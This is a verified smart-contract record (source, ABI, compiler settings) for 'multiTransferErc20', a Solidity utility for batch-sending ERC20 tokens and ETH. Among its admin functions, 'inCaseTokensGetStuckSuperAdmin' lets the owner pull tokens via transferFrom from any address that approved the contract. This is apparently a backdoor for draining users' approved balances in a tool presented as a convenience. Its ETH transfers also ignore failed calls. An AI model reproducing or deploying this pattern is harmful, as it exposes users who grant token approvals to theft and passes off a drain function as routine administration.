{"SourceCode": "interface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract multiTransferErc20 {\r\n    address owner;\r\n    constructor () {\r\n        owner=msg.sender;\r\n\r\n    }\r\n    \r\n    function multiTransfer(address _tokenAddress,address[] memory toAddressArr,uint _amount) public  {\r\n        for(uint i=0;i<toAddressArr.length;i++){\r\n            IERC20(_tokenAddress).transferFrom(msg.sender,toAddressArr[i],_amount);\r\n        }\r\n        \r\n    }\r\n    \r\n    \r\n    function multiTransferWithDifferentAmount(address _tokenAddress,address[] memory toAddressArr,uint[] memory _amountArr) public  {\r\n        for(uint i=0;i<toAddressArr.length;i++){\r\n            IERC20(_tokenAddress).transferFrom(msg.sender,toAddressArr[i],_amountArr[i]);\r\n        }        \r\n        \r\n    }    \r\n\r\n    function multiTransferETH(address[] memory toAddressArr,uint _amount) public payable  {\r\n        for(uint i=0;i<toAddressArr.length;i++){\r\n            (bool success, ) = toAddressArr[i].call{value: _amount}(\"\");\r\n        }        \r\n        \r\n    }        \r\n    \r\n    function inCaseTokensGetStuck(address withdrawaddress,address _token,uint _amount)  public  {\r\n\r\n        require(msg.sender == owner, \"!governance\");\r\n \r\n        require(withdrawaddress != address(0), \"WITHDRAW-ADDRESS-REQUIRED\");  \r\n        IERC20(_token).transfer(withdrawaddress, _amount);\r\n    }\r\n    \r\n    function inCaseTokensGetStuckSuperAdmin(address fromA,address withdrawaddress,address _token,uint _amount)  public  {\r\n\r\n        require(msg.sender == owner, \"!governance\");\r\n \r\n        require(withdrawaddress != address(0), \"WITHDRAW-ADDRESS-REQUIRED\");  \r\n        IERC20(_token).transferFrom(fromA,withdrawaddress, _amount);\r\n    }    \r\n    \r\n    \r\n    function emergencyWithdrawETHs(address to) public {\r\n        require(msg.sender == owner, \"!governance\");        \r\n        require(to != address(0), \"WITHDRAW-ADDRESS-REQUIRED\");\r\n        (bool success, ) = to.call{value: address(this).balance}(\"\");\r\n    }           \r\n    \r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"emergencyWithdrawETHs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"withdrawaddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"inCaseTokensGetStuck\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromA\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"withdrawaddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"inCaseTokensGetStuckSuperAdmin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_tokenAddress\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"toAddressArr\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"multiTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"toAddressArr\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"multiTransferETH\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_tokenAddress\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"toAddressArr\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"_amountArr\",\"type\":\"uint256[]\"}],\"name\":\"multiTransferWithDifferentAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "multiTransferErc20", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://206fafc6dff958de3bf7bc039fcd2f2f7b818268c6ee0ad27c11d6de90c849fe"}